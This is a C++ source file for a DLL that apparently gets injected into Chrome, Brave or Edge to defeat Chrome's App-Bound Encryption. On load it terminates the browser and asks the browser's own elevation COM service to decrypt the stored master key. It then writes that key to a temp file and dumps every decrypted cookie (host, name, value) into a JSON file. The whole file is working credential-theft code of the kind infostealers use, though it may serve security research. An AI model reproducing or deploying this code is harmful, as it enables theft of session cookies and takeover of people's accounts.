// chrome_decrypt.cpp
// v0.5 (c) Alexander 'xaitax' Hagenah
/*
 * Chrome App-Bound Encryption Service:
 * https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
 * https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view
 * Based on the code of @snovvcrash
 * https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
 */

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>
#include <algorithm>
#include <tlhelp32.h>
#include <bcrypt.h>
typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#include "sqlite3.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "sqlite3.lib")

namespace Logging
{
    std::string GetLogFilePath()
    {
        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath))
        {
            return std::string(tempPath) + "chrome_decrypt.log";
        }
        return "";
    }
    void Log(const std::string &message, bool overwrite = false)
    {
        std::string logFile = GetLogFilePath();
        if (!logFile.empty())
        {
            std::ofstream file(logFile, overwrite ? std::ios::trunc : std::ios::app);
            if (file)
            {
                file << message << std::endl;
                file.close();
            }
        }
    }
}

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
        const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        ProtectionLevel protection_level, const BSTR plaintext,
        BSTR *ciphertext, DWORD *last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
};

namespace ChromeAppBound
{
    constexpr size_t KeySize = 32;
    const uint8_t KeyPrefix[] = {'A', 'P', 'P', 'B'};

    struct BrowserConfig
    {
        CLSID clsid;
        IID iid;
        std::string executablePath;
        std::string localStatePath;
        std::string cookiePath;
        std::string name;
    };

    BrowserConfig GetBrowserConfig(const std::string &browserType)
    {
        if (browserType == "chrome")
        {
            return {
                {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
                {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "\\Google\\Chrome\\User Data\\Local State",
                "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
                "Chrome"};
        }
        else if (browserType == "brave")
        {
            return {
                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
                "Brave"};
        }
        else if (browserType == "edge")
        {
            return {
                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
                // Try the below values if Brave isn't installed
                // {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
                // {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\\Microsoft\\Edge\\User Data\\Local State",
                "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
                "Edge"};
        }
        throw std::invalid_argument("Unsupported browser type");
    }

    std::string BytesToHexString(const BYTE *byteArray, size_t size)
    {
        std::ostringstream oss;
        for (size_t i = 0; i < size; ++i)
        {
            oss << std::hex << std::setw(2) << std::setfill('0')
                << static_cast<int>(byteArray[i]);
        }
        return oss.str();
    }

    std::string GetAppDataPath()
    {
        char path[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) == S_OK)
            return std::string(path);
        return "";
    }

    std::vector<uint8_t> Base64Decode(const std::string &in)
    {
        static const std::string chars =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";
        auto is_b64 = [&](char c)
        { return isalnum(c) || (c == '+' || c == '/'); };
        int len = in.size(), i = 0, j = 0, idx = 0;
        uint8_t arr4[4], arr3[3];
        std::vector<uint8_t> out;
        while (len-- && in[idx] != '=' && is_b64(in[idx]))
        {
            arr4[i++] = in[idx++];
            if (i == 4)
            {
                for (i = 0; i < 4; i++)
                    arr4[i] = chars.find(arr4[i]);
                arr3[0] = (arr4[0] << 2) | ((arr4[1] & 0x30) >> 4);
                arr3[1] = ((arr4[1] & 0xf) << 4) | ((arr4[2] & 0x3c) >> 2);
                arr3[2] = (arr4[2] << 6) | arr4[3];
                out.insert(out.end(), arr3, arr3 + 3);
                i = 0;
            }
        }
        if (i)
        {
            for (j = i; j < 4; j++)
                arr4[j] = 0;
            for (j = 0; j < 4; j++)
                arr4[j] = chars.find(arr4[j]);
            arr3[0] = (arr4[0] << 2) | ((arr4[1] & 0x30) >> 4);
            arr3[1] = ((arr4[1] & 0xf) << 4) | ((arr4[2] & 0x3c) >> 2);
            arr3[2] = (arr4[2] << 6) | arr4[3];
            for (j = 0; j < i - 1; j++)
                out.push_back(arr3[j]);
        }
        Logging::Log("[+] Finished Base64 decoding (" + std::to_string(out.size()) + " bytes).");
        return out;
    }

    std::vector<uint8_t> RetrieveEncryptedKeyFromLocalState(const std::string &localStatePath)
    {
        std::string full = GetAppDataPath() + localStatePath;
        Logging::Log("[+] Local State path: " + full);
        std::ifstream f(full);
        if (!f)
        {
            Logging::Log("[-] Cannot open Local State");
            return {};
        }
        std::string txt((std::istreambuf_iterator<char>(f)), {});
        const std::string tag = "\"app_bound_encrypted_key\":\"";
        auto pos = txt.find(tag);
        if (pos == std::string::npos)
            return {};
        pos += tag.size();
        auto end = txt.find('"', pos);
        auto b64 = txt.substr(pos, end - pos);
        auto data = Base64Decode(b64);
        if (data.size() < sizeof(KeyPrefix) ||
            !std::equal(std::begin(KeyPrefix), std::end(KeyPrefix), data.begin()))
        {
            Logging::Log("[-] Invalid key header.");
            return {};
        }
        Logging::Log("[+] Key header is valid.");
        return {data.begin() + sizeof(KeyPrefix), data.end()};
    }

    std::string GetTempFilePath()
    {
        char tmp[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tmp) == 0)
            return "";
        return std::string(tmp) + "chrome_appbound_key.txt";
    }

    void SaveKeyToFile(const std::string &key)
    {
        auto path = GetTempFilePath();
        std::ofstream f(path, std::ios::trunc);
        if (f)
            f << key;
    }

    void KillBrowserProcesses(const std::string &browserType)
    {
        std::wstring proc = L"chrome.exe";
        if (browserType == "brave")
            proc = L"brave.exe";
        if (browserType == "edge")
            proc = L"msedge.exe";
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe))
        {
            do
            {
                if (proc == pe.szExeFile && pe.th32ProcessID != GetCurrentProcessId())
                {
                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h)
                    {
                        TerminateProcess(h, 0);
                        CloseHandle(h);
                    }
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }

    static std::string escapeJson(const std::string &s)
    {
        std::string out;
        out.reserve(s.size());
        for (char c : s)
        {
            switch (c)
            {
            case '\"':
                out += "\\\"";
                break;
            case '\\':
                out += "\\\\";
                break;
            case '\b':
                out += "\\b";
                break;
            case '\f':
                out += "\\f";
                break;
            case '\n':
                out += "\\n";
                break;
            case '\r':
                out += "\\r";
                break;
            case '\t':
                out += "\\t";
                break;
            default:
                if (static_cast<unsigned char>(c) < 0x20)
                {
                    std::ostringstream oss;
                    oss << "\\u"
                        << std::hex << std::setw(4) << std::setfill('0')
                        << static_cast<int>(c);
                    out += oss.str();
                }
                else
                {
                    out += c;
                }
            }
        }
        return out;
    }

    std::vector<uint8_t> DecryptGcm(
        const std::vector<uint8_t> &key,
        const uint8_t *iv, ULONG ivLen,
        const uint8_t *ct, ULONG ctLen,
        const uint8_t *tag, ULONG tagLen)
    {
        BCRYPT_ALG_HANDLE hAlg = nullptr;
        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
            return {};
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        BCRYPT_KEY_HANDLE hKey = nullptr;
        BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
                                   (PUCHAR)key.data(), (ULONG)key.size(), 0);
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)iv;
        authInfo.cbNonce = ivLen;
        authInfo.pbTag = (PUCHAR)tag;
        authInfo.cbTag = tagLen;
        std::vector<uint8_t> plain(ctLen);
        ULONG outLen = 0;
        auto status = BCryptDecrypt(
            hKey, (PUCHAR)ct, ctLen,
            &authInfo, nullptr, 0,
            plain.data(), ctLen, &outLen, 0);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        if (!NT_SUCCESS(status))
            return {};
        plain.resize(outLen);
        return plain;
    }

    std::string GetCookiesOutputPath(const std::string &browserName)
    {
        char tmp[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tmp) == 0)
            return "";
        return std::string(tmp) + browserName + "_decrypt_cookies.txt";
    }

    void DecryptCookies(const std::vector<uint8_t> &aesKey, const BrowserConfig &cfg)
    {
        std::string db = GetAppDataPath() + cfg.cookiePath;
        sqlite3 *conn = nullptr;
        if (sqlite3_open_v2(db.c_str(), &conn, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
        {
            Logging::Log(std::string("[-] sqlite3_open_v2 failed: ") + sqlite3_errmsg(conn));
            return;
        }

        sqlite3_stmt *stmt = nullptr;
        int rc = sqlite3_prepare_v2(conn,
                                    "SELECT host_key,name,encrypted_value FROM cookies;",
                                    -1, &stmt, nullptr);
        if (rc != SQLITE_OK)
        {
            Logging::Log(std::string("[-] sqlite3_prepare_v2 failed: ") + sqlite3_errmsg(conn));
            sqlite3_close(conn);
            return;
        }

        std::string outPath = GetCookiesOutputPath(cfg.name);
        std::ofstream out(outPath, std::ios::trunc);
        if (!out)
        {
            Logging::Log("[-] Could not open cookies output file: " + outPath);
            sqlite3_finalize(stmt);
            sqlite3_close(conn);
            return;
        }

        out << "[\n";
        bool first = true;
        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            const char *host = (const char *)sqlite3_column_text(stmt, 0);
            const char *name = (const char *)sqlite3_column_text(stmt, 1);
            const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 2);
            int len = sqlite3_column_bytes(stmt, 2);

            if (len > 3 && blob[0] == 'v' && blob[1] == '2' && blob[2] == '0')
            {
                const uint8_t *iv = blob + 3;
                ULONG ivLen = 12;
                const uint8_t *tag = blob + len - 16;
                ULONG tagLen = 16;
                ULONG ctLen = len - 3 - ivLen - tagLen;
                const uint8_t *ct = blob + 3 + ivLen;

                auto plain = DecryptGcm(aesKey, iv, ivLen, ct, ctLen, tag, tagLen);
                if (plain.size() > 32)
                {
                    std::string val((char *)plain.data() + 32,
                                    plain.size() - 32);
                    if (!first)
                        out << ",\n";
                    first = false;
                    out
                        << "  {"
                        << "\"host\":\"" << escapeJson(host) << "\","
                        << "\"name\":\"" << escapeJson(name) << "\","
                        << "\"value\":\"" << escapeJson(val) << "\""
                        << "}";
                    ++count;
                }
            }
        }

        out << "\n]\n";
        out.close();
        sqlite3_finalize(stmt);
        sqlite3_close(conn);

        Logging::Log("[*] " + std::to_string(count) + " Cookies extracted to " + outPath);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        Logging::Log("", true);

        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string browserType = "chrome";
        if (strstr(exePath, "brave.exe"))
            browserType = "brave";
        if (strstr(exePath, "msedge.exe"))
            browserType = "edge";

        ChromeAppBound::KillBrowserProcesses(browserType);
        Sleep(2000);

        if (SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
        {
            Logging::Log("[+] COM library initialized.");
        }
        else
        {
            Logging::Log("[-] Failed to initialize COM library.");
        }
        Microsoft::WRL::ComPtr<IElevator> elevator;
        auto cfg = ChromeAppBound::GetBrowserConfig(browserType);

        HRESULT hr = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, cfg.iid, (void **)&elevator);
        if (SUCCEEDED(hr))
        {
            Logging::Log("[+] IElevator instance created successfully.");
        }
        else
        {
            std::ostringstream err;
            err << "[-] CoCreateInstance failed: 0x" << std::hex << hr;
            Logging::Log(err.str());
        }
        if (SUCCEEDED(hr))
        {
            {
                HRESULT hr2 = CoSetProxyBlanket(
                    elevator.Get(),
                    RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                    COLE_DEFAULT_PRINCIPAL,
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                    RPC_C_IMP_LEVEL_IMPERSONATE,
                    nullptr,
                    EOAC_DYNAMIC_CLOAKING);
                if (SUCCEEDED(hr2))
                {
                    Logging::Log("[+] Proxy blanket set successfully.");
                }
                else
                {
                    std::ostringstream errProxy;
                    errProxy << "[-] Failed to set proxy blanket. HRESULT: 0x" << std::hex << hr2;
                    Logging::Log(errProxy.str());
                }
            }

            auto encKey = ChromeAppBound::RetrieveEncryptedKeyFromLocalState(cfg.localStatePath);
            if (encKey.empty())
            {
                Logging::Log("[-] No valid encrypted key retrieved.");
            }
            if (!encKey.empty())
            {
                Logging::Log("[+] Encrypted key blob retrieved (" + std::to_string(encKey.size()) + " bytes).");
                {
                    auto previewLen = std::min<size_t>(20, encKey.size());
                    std::string shortKey = ChromeAppBound::BytesToHexString(encKey.data(), previewLen);
                    Logging::Log("[+] Encrypted key retrieved: " + shortKey + "...");
                }
                BSTR b64 = SysAllocStringByteLen((char *)encKey.data(), encKey.size());
                Logging::Log("[+] BSTR allocated for encrypted key.");
                BSTR plain = nullptr;
                DWORD lastErr = ERROR_GEN_FAILURE;
                HRESULT dhr = elevator->DecryptData(b64, &plain, &lastErr);
                if (SUCCEEDED(dhr) && SysStringByteLen(plain) == ChromeAppBound::KeySize)
                {
                    Logging::Log("[+] Decryption successful.");
                    BYTE keyBytes[ChromeAppBound::KeySize];
                    memcpy(keyBytes, plain, ChromeAppBound::KeySize);
                    SysFreeString(plain);

                    std::string hexKey = ChromeAppBound::BytesToHexString(keyBytes, ChromeAppBound::KeySize);
                    ChromeAppBound::SaveKeyToFile(hexKey);
                    Logging::Log("[+] Decrypted Key: " + hexKey);

                    std::vector<uint8_t> aesKey(keyBytes, keyBytes + ChromeAppBound::KeySize);
                    ChromeAppBound::DecryptCookies(aesKey, cfg);
                }
                else
                {
                    std::ostringstream err;
                    err << "[-] DecryptData failed. LastError: " << lastErr;
                    Logging::Log(err.str());
                }
                SysFreeString(b64);
            }
        }
        CoUninitialize();
    }
    return TRUE;
}
